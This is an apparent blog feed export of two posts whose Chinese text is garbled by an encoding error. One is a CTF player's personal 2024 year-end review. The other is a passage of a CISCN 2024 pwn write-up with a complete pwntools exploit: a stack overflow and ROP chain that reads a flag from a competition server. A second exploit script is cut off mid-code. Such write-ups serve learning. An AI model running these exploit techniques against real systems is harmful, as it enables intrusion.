    <content type="html"><![CDATA[<h1 id="ä¸ºä»€ä¹ˆ25å¹´å†™24å¹´çš„å¹´ç»ˆæ€»ç»“ï¼ŸğŸ˜°"><a href="#ä¸ºä»€ä¹ˆ25å¹´å†™24å¹´çš„å¹´ç»ˆæ€»ç»“ï¼ŸğŸ˜°" class="headerlink" title="ä¸ºä»€ä¹ˆ25å¹´å†™24å¹´çš„å¹´ç»ˆæ€»ç»“ï¼ŸğŸ˜°"></a>ä¸ºä»€ä¹ˆ25å¹´å†™24å¹´çš„å¹´ç»ˆæ€»ç»“ï¼ŸğŸ˜°</h1><p>Manï¼å› ä¸ºæ²Ÿæ§½çš„ğŸ‘®â€è¡Œæ”¿æ³•å­¦å’Œæ²Ÿæ§½çš„ä¿¡å®‰ä½“ç³»</p><p>å¦ˆå¦ˆç”Ÿçš„ï¼Œé¼ é¼ ä¸€ä¸ªåˆ°æ—¶å€™æ‹¿å·¥å­¦å­¦ä½çš„èƒŒæ³•èƒŒé”æ­»å»æ´»æ¥</p><p>ä¸”ä¸å¹¸åœ°é£Ÿç‰©ä¸­æ¯’ï¼Œå·®ç‚¹ç»™æˆ‘å¹²è„±æ°´äº†ï¼Œæ‚²</p><p>æ˜¨å¤©åˆšé€ƒç¦»ç™¾äº¬</p><p>ä»Šå¤©ä¸€èµ·æ¥æ‰“å¼€vxï¼Œå‘ç°åŒå®éªŒå®¤ä¸€ä¸ªå¸ˆå…„ğŸäº†ğŸ˜°</p><p>è‡ªæµ‹äº†ä¸€ä¸‹è¿˜å¥½æ²¡äº‹</p><p>å‘½é€”å¤šèˆ›</p><p>æ‚²</p><p>ç©äº†ä¸€ä¸Šåˆæ²Ÿæ§½åœ°é¸£æ½®ï¼Œçªç„¶<del>æƒ³èµ·æ¥å¹´ç»ˆæ€»ç»“è¿˜æ²¡å†™</del>æœ‰æ„Ÿè€Œå‘</p><p>æ•…è®°</p><h1 id="ç«èµ›"><a href="#ç«èµ›" class="headerlink" title="ç«èµ›"></a>ç«èµ›</h1><p>24å¹´ç®—æ˜¯çœŸå®é™…æ„ä¹‰ä¸Šå…¨å›½å¯é£çš„ä¸€å¹´å§</p><p>å¹´åˆå»äº†éƒ‘å·ï¼Œåº§äº†2å¤©ç©¶æç‰¢ï¼Œæ‹¿äº†ppsucç¬¬ä¸€ä¸ªå¼ºç½‘çº¿ä¸‹å¥–ï¼Œè™½ç„¶æ˜¯ä¸ªä¸‰ç­‰ï¼Œè™½ç„¶é¼ é¼ åŸºæœ¬æ²¡è¾“å‡ºğŸ˜­</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103192304.jpg" style="zoom:67%;" /><p>é¼ é¼ è¿˜ä»¥ä¸ºæœ‰Iotï¼Œç”µçƒ™é“ã€çƒ­é£æªå•¥çš„å…¨å¸¦äº†ï¼Œç„¶åä¸€çœ‹winå†…æ ¸ï¼Œv8ï¼Œvm escapeï¼Œç›´æ¥å°è¢«ä¸€ç›–å¼€æ‘†äº†</p><p>å’Œdbtã€telå“¥å“¥ã€æ—¶æ€»ä»–ä»¬åƒäº†äººç”Ÿç¬¬ä¸€é¡¿å‡Œæ™¨å››ç‚¹çš„æµ·åº•æğŸ˜‹</p><p>åˆ°äº†å››æœˆå§ï¼Œç»ˆäºæ‰“ä¸Šäº†å¿ƒå¿ƒå¿µå¿µçš„è¥¿è‘«èŠ¦ğŸ—¡</p><p>ç»“æœå°±åº”è¯¥å»4ä¸ªå–è¯miscğŸ‘´ï¼Œioté‚£ä¸ªæ¿å­æŠŠå›ºä»¶æå®Œï¼Œæå®ŒåŸºæœ¬çš„å°±ä¸çŸ¥é“äº†ï¼Œèµ›åçœ‹äº†NamelessğŸ‘´çš„èµ›åremakeï¼Œæ‰çŸ¥é“æœ‰è¿™ä¹ˆå¤šä¸œè¥¿ğŸ˜°</p><p>æœ€åè¿˜æ˜¯ä¸‰ç­‰ï¼Œä¹Ÿç®—äº†å¼¥è¡¥ä¸Šä¸€å±Šçš„é—æ†¾å§</p><p>å› ä¸ºç¦»å®¶æ¯”è¾ƒè¿‘ï¼Œè€çˆ¹æ¥æ­å·è¯·æˆ‘ä»¬æ°é¥­ï¼Œé¼ é¼ ä¸€ä¸ªåŠ²çš„ç»™é˜Ÿå‹å€’å°éº¦æœæ±</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103193043.jpg" style="zoom:67%;" /><p>ç„¶åå°±æ˜¯æ²Ÿæ§½çš„é“ä¸‰ï¼Œé¼ é¼ ä¸åšè¯„ä»·</p><p>å”¯ä¸€å€¼å¾—æçš„å°±æ˜¯é¼ é¼ è§„åˆ’å‡ºäº†500å—ä»åŒ—äº¬â€”â€”ç¦å·çš„äº¤é€šï¼</p><p>åŒ—äº¬å¤§å…´é£æ¸©å·é¾™æ¹¾ï¼Œæ¸©å·é«˜é“åˆ°ç¦å·ï¼Œç®€ç›´æ˜¯ç†è´¢å¸¦å¸ˆ</p><p>å›æ¥ååˆåˆ°äº†å–œé—»ä¹è§çš„å›½èµ›ç¯èŠ‚</p><p>è¿™B protobufæ²¡å®Œäº†æ˜¯å§ğŸ‘Š</p><p>ç¬¬ä¸€å¤©ç³¯äº†ï¼Œpythonæ²¡è·‘å‡ºæ¥å°±ä¸åšäº†ï¼Œæ²¡æƒ³åˆ°ç¡¬é€†10åˆ†é’Ÿç»“æ„ä½“å‡ºæ¥äº†ğŸ˜°</p><p>ç¬¬äºŒå¤©inkeyğŸ‘´æ­»ç£•äº†ä¸€é“vmå‡ºæ¥æŠŠå±±æ²³å“¥å“¥ä»–ä»¬æŠ¬åˆ°äº†å…¨å›½rank 11</p><p>inkey ! inkey ! inkey ï¼</p><p>åˆ†åŒºä¸€å¼€å§‹ç´§å¼ æ­»ï¼Œç»“æœå°±æ˜¯é¼ é¼ 1h fix 3 attack 1ï¼Œç„¶åèººåˆ°ç»“æŸäº†ğŸ¤”</p><p>æœ€årank4ï¼ŒæˆåŠŸæ‹¿åˆ°äº†å†³èµ›çš„é—¨ç¥¨</p><p>é‚£å¤©çš„å¤•é˜³è®°å¿†å°¤æ–°</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_2025010319131.jpg" style="zoom:67%;" /><p>å†³èµ›çš„å¯ä¿¡åæ­£åˆæ˜¯ä¾æ‰˜</p><p>ç¬¬ä¸€å¤©awdpæ‰“å®Œæ˜¯rank20çš„æ ·å­</p><p>ä»scuå¾€å¤–èµ°çš„è·¯ä¸Šï¼Œå’Œé«˜è€å¸ˆæ‰“ç”µè¯æ±‡æŠ¥æƒ…å†µï¼Œç„¶åå‘ç”Ÿäº†ä¸€ä»¶å·¨ææ€–çš„äº‹æƒ…</p><p>é«˜è€å¸ˆå‘äº†ä¸€å¼ æˆ‘ä»¬å››ä¸ªäººèµ°è·¯çš„ç…§ç‰‡è¿‡æ¥ï¼Œæˆ‘å›å¤´çœ‹äº†å¥½ä¹…éƒ½æ²¡æœ‰äººğŸ˜°</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103194548.jpg" style="zoom:67%;" /><p>å¤ªå“ˆäººäº†ï¼ˆè€å¸ˆæ²¡è·Ÿæˆ‘ä»¬æ¥å•ŠğŸ˜°ï¼‰</p><p>ç¬¬äºŒå¤©ï¼Œå¾ˆäº‘å¢ƒé£æ ¼çš„æ¸—é€ï¼Œå‘¨å“¥ä¸€ä¸ªäººæ¸—é€æ‰“åˆ°rank 11!</p><p>æµ©äºŒç‰›é€¼ï¼</p><p>åæ¥å¤ç›˜èµ·æ¥åº”è¯¥è¿˜èƒ½æ›´é«˜ç‚¹ï¼Œæœ‰ä¸ªåƒåœ¾å¿˜ç¿»äº†</p><p>ps : é¼ é¼ åœ¨æ—è¾¹file locationæœçš„CPUå—å†’çƒŸäº†å‘œå‘œ</p><p>æœ€åæ˜¯rank14ï¼Œ0psu3æ‹¿åˆ°äº†é˜Ÿå²çš„ç¬¬ä¸€ä¸ªå›½ä¸€ï¼</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103195045.jpg" style="zoom:67%;" /><p>ç¿»å›¾ç‰‡ç›´æ’­çš„æ—¶å€™ï¼Œå‘ç°åªæœ‰æˆ‘ä»¬çš„é˜Ÿåæœ‰ç‰¹å†™ï¼Œwin! ï¼ˆè„‰åŠ¨æ‰“é’±ï¼‰</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103195504.jpg" style="zoom:67%;" /><p>åƒå®Œçƒ¤é±¼ç«™åœ¨å¤©æ¡¥ä¸Šï¼Œçœ‹ç€ä¸‹é¢çš„å·æµä¸æ¯ï¼Œæ„Ÿè§‰è¿™ä¸€é˜¶æ®µç»ˆäºèƒ½ç”»ä¸Šä¸€ä¸ªå¥å·äº†</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103195336.jpg" style="zoom:67%;" /><p>åé¢å°±å¤„äºåŠé€€å½¹çŠ¶æ€äº†ï¼Œå¼€å§‹è½¬å‘æ¸—é€çš„å­¦ä¹ </p><p>æœ¬æ¥æƒ³æ‰“ä¸ªè“å¸½ç©ç©ï¼Œæ²¡æƒ³åˆ°è“å¸½è‡ªå·±æ²¡äº†ğŸ˜°</p><p>ç ”ç©¶ç”Ÿå›½èµ›è¿™ä¸ªæˆ˜ç»©æœ‰ç‚¹éš¾çœ‹ï¼Œå½“æˆ˜çŠ¯äº†å°±ä¸æäº†</p><p>åˆæ˜¯ä¸€å¹´å¼ºç½‘ï¼Œå’Œæ­å¸ˆç»„äº†ä¸€ä¸ªè”é˜Ÿç©ï¼Œç»“æŸå‰10åˆ†é’Ÿæ†‹äº†ä¸ªqrouteå‡ºæ¥ï¼Œä¹Ÿè¿˜è¡Œ</p><p>ç½‘é¼å±äºæ˜¯æˆ‘å’Œå‘¨å“¥ä¸¤ä¸ªåŠæˆªèº«å­å…¥åœŸçš„äººè¢«å¸ˆå…„å’Œå¸ˆå¼Ÿæ‹‰å‡ºæ¥æ‰“</p><p>åæ­£æ²¡çœ‹æ‡‚èµ›åˆ¶ï¼Œå°±å½“å»è´µå·æ—…æ¸¸äº†</p><p>éš¾ç»·çš„æ£€ç–«åˆæ ¼</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103200345.jpg" style="zoom:67%;" /><p>ç»“æœåŠå†³èµ›æˆ‘åœ¨å½“miscæ‰‹ğŸ¤¡ï¼ˆè¿™åˆé€‚å—ï¼‰</p><p>å› ä¸ºé˜Ÿä¼é…ç½®æŒºä¸é”™çš„ï¼Œæ¯ä¸ªèµ›é“éƒ½æœ‰è¾“å‡ºï¼Œæœ€åä¹Ÿæ˜¯çªç ´äº†æ ¡é˜Ÿå†å²ï¼Œè¿›ç½‘é¼å†³èµ›</p><p>è‡³äºå†³èµ›ï¼Œ9åˆ†é’Ÿæ‰“å®Œçš„æ ¸å¿ƒé¶æ ‡ï¼Œè¯´é¸¡æ¯›ğŸ˜…ï¼Ÿ</p><p>å› ä¸ºè§è§è¦æ¥ç½‘é¼å½“è£åˆ¤</p><p>æ‰€ä»¥éš¾å¾—çš„æœ‰å¼ å’Œé«˜è€å¸ˆçš„åˆå½±</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103200316.jpg" style="zoom:67%;" /><p>è€å¸ˆè¿˜è¯·äº†é…¸æ±¤ç«é”…ğŸ˜‹</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103200437.jpg" style="zoom:67%;" /><p>æ²¡èƒ½å»æˆå¼ºç½‘çº¿ä¸‹ï¼Œé—æ†¾ä¸èƒ½è§åˆ°åœˆåœˆ</p><p>æ„Ÿè§‰è¿™ä¸€å¹´å’ŒåœˆåœˆèŠäº†å¾ˆå¤šï¼Œ<del>qjxæˆ‘å®£ä½ ï¼</del></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103205621.jpg"></p><p>ç„¶åå•Šï¼Œä¹Ÿè¯¥å»å’Œè”è€ƒå¯¹çº¿äº†</p><p>æ•…äº‹éƒ½æœ‰ç»“å°¾ï¼Œä¸æ˜¯å—ï¼Ÿ</p><p>ç­‰é¼ é¼ ä¸€å¹´åå›æ¥å‘œå‘œğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­</p><h1 id="å­¦ä¸š"><a href="#å­¦ä¸š" class="headerlink" title="å­¦ä¸š"></a>å­¦ä¸š</h1><p>æ²¡å•¥å¥½è¯´çš„</p><p>æ¯”è¾ƒå¥½ç©çš„ä¹Ÿå°±æ˜¯ä¸ªå°„å‡»è¯¾ï¼Œæ‰“äº†æ‰çŸ¥é“ååº§çœŸå‹ä¸ä½</p><p>å½“åˆç»ƒçš„é¶å­ï¼ˆä»€ä¹ˆå¼¹é“åä¸‹ï¼‰</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103201850.jpg" style="zoom:67%;" /><p>å½“åˆå…¥å­¦å°±æ²¡æƒ³ç€äº‰ä¿ç ”èµ„æ ¼</p><p>ç»“æœç°åœ¨ä¸€çœ‹æ€ä¹ˆ21çš„åŒç”Ÿæºåœ°çš„å¸ˆå…„å¸ˆå§ä¿äº†è¿™ä¹ˆå¤šğŸ˜°</p><p>é‚£åªèƒ½æ¢­å“ˆè”è€ƒäº†</p><p><del>å†é­å°¸ä¸€éæ²Ÿæ§½çš„ğŸ‘®â€è¡Œæ”¿æ³•å­¦å’Œä¿¡æ¯å®‰å…¨ä½“ç³»</del></p><h1 id="ç”Ÿæ´»"><a href="#ç”Ÿæ´»" class="headerlink" title="ç”Ÿæ´»"></a>ç”Ÿæ´»</h1><p>1æœˆåˆå›äº†è¶Ÿé«˜ä¸­ï¼ŒçœŸçš„å¾ˆæ€€å¿µå•Š</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103202209.jpg" style="zoom:67%;" /><p>å’Œè°¢è€å¸ˆå»äº†è¶Ÿé•¿æ²™ï¼Œç”¨mzçš„è¯æ¥è¯´ï¼Œå¯’å‡èµ°åœ¨äº”ä¸€å¹¿åœºçš„è·¯ä¸Šï¼Œå°±æ˜¯åœ¨ç»ƒè‚˜å‡»</p><p>å­Ÿè€å¸ˆçš„è¯è¿˜æ˜¯ä¸€å¦‚æ—¢å¾€çš„ç²¾è¾Ÿ</p><p>åœ¨é•¿æ²™ä¸€ä¸ªå¤©æ¡¥ä¸‹çœ‹åˆ°çš„æ¶‚é¸¦ï¼Œå¾ˆç¾ä¸½çš„ç²¾ç¥çŠ¶æ€ï¼Œä¹Ÿæ˜¯é¼ é¼ ç°åœ¨çš„ç²¾ç¥çŠ¶æ€ğŸ˜¢</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103202537.jpg" style="zoom:67%;" /><p>å¤šå¤šåœ¨é˜³å…‰ä¸‹æ˜¯çœŸå¥½çœ‹</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103202644.jpg" style="zoom:67%;" /><p>äº”ä¸€å°é•¿å‡å’Œä¹å®å»äº†ä¹Œå…°å¯Ÿå¸ƒ</p><p>æ€ä¹ˆè¯´å‘¢ï¼Œæœ‰ç‚¹è¢«ç½‘å›¾è¯ˆéª—ğŸ¤”ï¼Œç‰©ä»·ä¹Ÿä¸ä½ï¼Œç•¥è¿‡</p><p>å…¥æ‰‹äº†ç¬¬ä¸€å°èƒ¶ç‰‡æœºï¼Œæ—è½´7ğŸ—¡ QL17M3çš„å­™å­QL17</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103203223.jpg" style="zoom: 67%;" /><p>æš‘å‡ä¹Ÿå°±å»äº†ä¸ªæ­å·æ¼«å±•ï¼Œæ’åˆ°äº†åå…«çš„ç­¾å”®</p><p>ä¹Ÿæ˜¯åœ¨é‚£æ—¶å€™å¼€å§‹äº†åœºç…§å­¦ä¹ </p><p>ä¸­ç§‹å’Œdbtã€eeeeã€sinkåœ¨åœ†æ˜å›­ä¹±é€›</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103204027.jpg" style="zoom: 67%;" /><p>eeeeçœŸçš„å¸…å§</p><p>æ˜¯å§ï¼Ÿ</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103204149.png" style="zoom: 67%;" /><p>å›½åº†å»äº†è¥¿å®‰ï¼Œå’ŒçŒ«ç½åˆäº†ç…§</p><p>ç½çœŸçš„å¥½ä¼Ÿå¤§çš„ä¸€å¼ è„¸å‘œå‘œå‘œğŸ˜­ğŸ˜­ğŸ˜­</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250103203619.jpg" style="zoom: 67%;" /><p>é™•è¥¿å†å²åšç‰©é¦†çœŸçš„å¾ˆæ£’ï¼</p><p>â€œæ–—è½¬æ˜Ÿç§»ï¼Œä¸‡ç‰©ä¹¾å¤ï¼›ä¸­åæ–‡æ˜ï¼Œç‰æ·é‡‘å£°â€</p><p>ç ”ç©¶ç”Ÿå›½èµ›åœ¨NCCå’Œé«˜ä¸­åŒå­¦ç¢°é¢äº†</p><p>çœŸæ˜¯ç‹ ç‹ xmäº†</p><h1 id="æ„Ÿæƒ…"><a href="#æ„Ÿæƒ…" class="headerlink" title="æ„Ÿæƒ…"></a>æ„Ÿæƒ…</h1><p>è¿˜æ˜¯æ²¡æœ‰ï¼ˆè‰¹äº†ï¼‰</p><p>pass</p><p>è¯è¯´è¿™ä¸ªä¸“æ æ˜¯ä¸æ˜¯å¹´å¹´å¼€ï¼Œå¹´å¹´ç©ºç™½æ¥ç€ğŸ¤¡</p><h1 id="æœ€åçš„æœ€å"><a href="#æœ€åçš„æœ€å" class="headerlink" title="æœ€åçš„æœ€å"></a>æœ€åçš„æœ€å</h1><p>å®Œæˆäº†ä¸€éƒ¨åˆ†</p><p>ä¹Ÿå¤±å»äº†ä¸€éƒ¨åˆ†</p><p>å¯¹äºæœªæ¥çš„å±•æœ›ï¼Œæœ‰å—ï¼Œæˆ–è®¸æœ‰</p><p>ä½†è¿˜æ˜¯å®ç°çš„æ—¶å€™å†è®°ä¸Šå§ï¼Œå…å¾—æ¥å¹´å¾’å¢æ„Ÿä¼¤</p><p>â€‹                                                                </p><p>2025.1.3 å†™äºä¼šç¨½å±±é˜´</p>]]></content>
    
    
    <categories>
      
      <category>shellä¹‹å¤–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¢ç¢å¿µ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn2024åˆèµ› PWNæ–¹å‘å…¨wp</title>
    <link href="/2024/05/22/ciscn2024-quals/"/>
    <url>/2024/05/22/ciscn2024-quals/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰"><a href="#0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰" class="headerlink" title="0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰"></a>0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰</h1><p>pwn 4&#x2F;6</p><p>å“ï¼Œå¹³æ—¶æ‘¸çš„ä¸€åˆ‡çš„é±¼ï¼Œéƒ½ä¼šåœ¨æ¯”èµ›çš„æ—¶å€™è‡ªé£Ÿå…¶æœ</p><p>è¢«enllusionæ€çˆ†äº†å‘œå‘œå‘œğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ï¼Œæƒ³å½“åˆé¼ é¼ è¿˜æ˜¯å’Œä»–åŸºæœ¬åœ¨ä¸€ä¸ªæ°´å¹³çº¿ä¸Šçš„å‘œå‘œ</p><p>ç»“æœå‘¢ï¼ŒåŠªåŠ›çš„äººå»äº†N1ï¼Œæ‘†çƒ‚çš„äººè¿˜åœ¨åŸåœ°è¸æ­¥</p><p>ğŸ¤¡</p><p>å¦ˆå¦ˆç”Ÿçš„ï¼Œemoå®Œäº†ä¹Ÿè¯¥éª‚éª‚è¿™ğŸ’©é¢˜äº†</p><p>å»å¹´protobufå‡ºé¢˜äº†ï¼Œä»Šå¹´è¿˜æ²¡å®Œäº†æ˜¯å§ï¼Œä¸¤å¤©éƒ½æœ‰</p><p>è¿˜æœ‰é‚£j8 ptmallocçœŸçš„å¾ˆå¥½ç©å˜›ï¼Ÿå—¯ï¼Ÿé¼ é¼ çœŸçš„ä¹°ä¸èµ·houseå‘œå‘œ</p><h1 id="0x01ï¼šæŠ½è±¡ã®èµ›é¢˜"><a href="#0x01ï¼šæŠ½è±¡ã®èµ›é¢˜" class="headerlink" title="0x01ï¼šæŠ½è±¡ã®èµ›é¢˜"></a>0x01ï¼šæŠ½è±¡ã®èµ›é¢˜</h1><h2 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h2><p>ç»å…¸goé¢˜ï¼Œæµ‹ä¸ªæº¢å‡ºï¼Œæ³¨æ„æ¢å¤ä¸€ä¸‹æ ˆä¸Šæ•°æ®å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./gostack&#x27;</span>)<br><br>flag = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;8.147.133.80&#x27;</span>, <span class="hljs-number">32778</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./gostack&quot;</span>)<br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><br><span class="hljs-comment">#0x0000000000414217: mov rdi, rax; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret;</span><br>magic = <span class="hljs-number">0x414217</span><br>pop_rax = <span class="hljs-number">0x000000000040f984</span><br>pop_rsi = <span class="hljs-number">0x000000000042138a</span><br>pop_rdx = <span class="hljs-number">0x00000000004944ec</span><br>syscall = <span class="hljs-number">0x00000000004616c9</span><br><br><span class="hljs-comment"># gdb.attach(p, &quot;b *0x4a0a97\nc\n&quot;)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span><br>payload += p64(<span class="hljs-number">0xc000180000</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4aa800</span>) + p64(<span class="hljs-number">0x4df040</span>) + p64(<span class="hljs-number">0xc000046d98</span>)<br>payload = payload.ljust(<span class="hljs-number">0x1d0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload += p64(pop_rax) + p64(<span class="hljs-number">0x4a295a</span>) + p64(magic) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(syscall)<br>payload += p64(pop_rax) + p64(<span class="hljs-number">3</span>) + p64(magic) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(elf.bss(<span class="hljs-number">0x800</span>)) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(syscall)<br>payload += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(magic) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(syscall)<br>sla(<span class="hljs-string">b&#x27; :\n&#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h2><p>2.23ï¼Œå¥½ä¹…æ²¡è§äº†ï¼Œæ”¹ä¸ªtopchunk size</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br>flag = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;8.147.133.80&#x27;</span>, <span class="hljs-number">23833</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./chal&quot;</span>)<br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr 